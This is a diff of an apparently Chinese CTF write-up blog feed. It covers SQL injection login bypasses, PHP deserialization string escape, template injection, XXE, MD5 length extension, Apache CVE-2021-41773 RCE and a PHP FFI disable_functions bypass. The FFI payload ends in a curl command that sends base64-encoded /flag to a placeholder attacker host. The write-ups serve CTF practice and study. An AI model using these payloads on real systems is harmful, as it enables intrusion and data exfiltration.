-<p>锻炼一下代码审计的功力</p>
-<p>CTF的Web现在越来越卷，要加强一下自己的代码审计能力了</p>
-<span id="more"></span>
-<h2 id="web301sql注入">1、Web301（SQL注入）</h2>
-<p>非常简单，联合注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; union select 123;#-- -</span><br></pre></td></tr></table></figure>
-<h2 id="web302sql注入">2、Web302（SQL注入）</h2>
-<p>这次的数据库存储密码是md5加密</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> md5(md5(<span class="variable">$str</span>.md5(base64_encode(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但是代码审计还是不难的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username = 123&#x27; union select &#x27;ebc21ce74a2153bbcf593e4f7d61479a&#x27;;#-- -</span><br><span class="line">password = 123</span><br></pre></td></tr></table></figure>
-<p>顺利通过身份校验，获得flag</p>
-<h2 id="web303">3、Web303（）</h2>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>wp</tag>
-        <tag>audit</tag>
       </tags>
   </entry>
   <entry>
@@ -1371,8 +1353,10 @@ m = A^{-1}c\\
 <p>先看看漏洞的代码，这里选了部分，后续就是常见的<code>session</code>反序列化漏洞，访问一个开了<code>session</code>的<code>php</code>资源，然后验证<code>token</code>，获取反序列化的结果：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p>这里主要的点就是，要如何把<code>admin</code>写入函数中，这里我们注意到有一个可以利用的攻击点就是<code>str_replace</code>，这里我们看到<code>fuck</code>被<code>loveU</code>替换。看下面几个例子。</p>
-<p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"fuck""</strong>;s:5:"token";s:4:"user";} O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"loveU""</strong>;s:5:"token";s:4:"user";}</p>
-<p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"fuckfuck"1"</strong>;s:5:"token";s:4:"user";} O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"loveUloveU"1"</strong>;s:5:"token";s:4:"user";}</p>
+<p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"fuck""</strong>;s:5:"token";s:4:"user";}<br />
+O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:5:<strong>"loveU""</strong>;s:5:"token";s:4:"user";}</p>
+<p>O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"fuckfuck"1"</strong>;s:5:"token";s:4:"user";}<br />
+O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"1";s:2:"to";s:10:<strong>"loveUloveU"1"</strong>;s:5:"token";s:4:"user";}</p>
 <p>显然我们可以注意到，如果我们在原句子中使用<code>"</code>，那么和<code>loveU</code>拼接之后，后面的字符串就可以逃逸。由于<code>loveU</code>的长度比<code>fuck</code>多1，我们就多出了可以利用的空间，同时确保反序列化时的字符串对应长度不会出错。</p>
 <p>我们是要在后面逃逸出这样的字符串</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
@@ -1420,8 +1404,8 @@ m = A^{-1}c\\
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>反序列化</tag>
       </tags>
   </entry>
@@ -1523,9 +1507,7 @@ m = A^{-1}c\\
 <p>发现源代码中在age这个点有渲染，同时我们可以找到age的注入点，猜测是不是go有SSTI。</p>
 <p>https://tyskill.github.io/posts/gossti</p>
 <p>于是照着文章里尝试看看能不能打出admin的Password，顺利拿到flag。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /><figcaption aria-hidden="true">image-20220816155906990</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /></p>
 <h3 id="bjdctf-cookie-stubletwig模板注入">2、BJDCTF-Cookie stuble（twig模板注入）</h3>
 <p>打开界面，Hint提示看一下Cookies，同时发现前端会动态显示用户名</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png" alt="img" style="zoom:50%;" /></p>
@@ -1551,9 +1533,7 @@ m = A^{-1}c\\
 <p>接下来就是制作存在XXE的xlsx文件，直接读取<code>/flag</code>（之前在任意读取时，测试发现这个文件被ban掉了）</p>
 <p>制作的时候需要注意，xlsx改后缀为zip文件后，直接用winrar打开后在内部修改，解压后再压缩可能出现问题。</p>
 <p>最后打出flag。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /><figcaption aria-hidden="true">image-20220816152852215</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /></p>
 <h2 id="代码审计">6、代码审计</h2>
 <h3 id="de1ctf-2019ssrf-me代码审计哈希扩展攻击">1、[De1ctf 2019]SSRF Me（代码审计/哈希扩展攻击）</h3>
 <p>首先看源代码</p>
@@ -1575,14 +1555,10 @@ m = A^{-1}c\\
 <p>需要注意的是此处必须是salt + message，如果顺序颠倒，则无法实现md5hash扩展攻击。</p>
 <p>利用现成的脚本:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">28 = len(secret_key) + len(&quot;flag.txt&quot;) + len(&quot;read&quot;)</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /><figcaption aria-hidden="true">image-20221018011057035</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /></p>
 <p>将生成的结果注入，注意要在action前面加上scan</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txt</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /><figcaption aria-hidden="true">image-20221018011220758</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /></p>
 <h3 id="gfctf-baby_web变量覆盖">2、GFCTF-Baby_Web（变量覆盖）</h3>
 <p>这道题主要考察PHP源码审计的能力，当然要想做出来这道题，还是需要一些额外的技巧。</p>
 <p><code>F12</code>发现源代码，暗示存在路径穿越。</p>
@@ -1608,31 +1584,21 @@ m = A^{-1}c\\
 <h3 id="nssez_rcecve-2021-41773">1、NSS—ez_rce（CVE-2021-41773）</h3>
 <p>打开网页，啥都没有，抓个包发现headers里也没有信息，只能扫一下目录，看看有没有源码/后台/api泄露。</p>
 <p>如果再没有，看看服务器中间件等等有无一些新出的CVE。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /><figcaption aria-hidden="true">image-20220819205451649</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /></p>
 <p>看到/cgi-bin，想到之前apache出的cve，检查一下apache的版本2.4.49，基本确定是路径穿越的CVE。</p>
 <p>于是使用rce的payload：</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /><figcaption aria-hidden="true">image-20220819205728808</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /></p>
 <p>利用grep找到flag</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /><figcaption aria-hidden="true">image-20220819205821071</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /></p>
 <h2 id="php扩展">9、PHP扩展</h2>
 <h3 id="rctf-nextphpffi">1、RCTF-nextphp（FFI）</h3>
 <p>这道题的代码还是非常简单，单刀直入。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>查看phpinfo之后发现经典的disable_function</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /><figcaption aria-hidden="true">image-20220923152627815</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /></p>
 <p>蚁剑连接之后，发现没法上传文件，LD_PRELOAD的利用失败了。</p>
 <p>发现同目录下存在preload.php，并且该文件可编辑，也被index.php包含了</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /><figcaption aria-hidden="true">image-20220923161449908</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">            <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char *command);&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">            array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>看起来我们的攻击点在run函数，如何利用run函数是一个问题</p>
 <p>这里就引到了PHP的FFI扩展，简单来说就是在PHP中引入C语言的这样一种机制，那么我们就可以利用C语言标准库里的system来绕过disable_function。</p>
@@ -1646,9 +1612,7 @@ m = A^{-1}c\\
 <p>首先，我们注意到存在两个序列化函数，两者的效果是不同，__serialize()返回的是数组的序列化结果，serialize()返回的是class A的序列化结果。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;int system(char *command);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//注意两者的区别</span></span><br><span class="line">C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">89</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;int system(char *command);&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>其次，对于获取到被赋值的data['ret']，最开始的时候我想的是直接修改源代码，将data属性修改为public，但是失败了var_dump查看之后，发现属性仍然为protected，查询了opache.preload，才发现preload.php已经被编译为opcode，我们修改文本是没有意义的。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /><figcaption aria-hidden="true">image-20220923161825562</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /></p>
 <p>于是重新构造payload，这回利用__serialize()能够返回data，最后成功构造payload。</p>
 <p>最后是无回显的，当然这已经是小问题了。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=unserialize(<span class="string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>)-&gt;__serialize()[<span class="string">&#x27;ret&#x27;</span>]-&gt;system(<span class="string">&#x27;curl http://your-ip:port/`cat /flag | base64`&#x27;</span>);</span><br></pre></td></tr></table></figure>
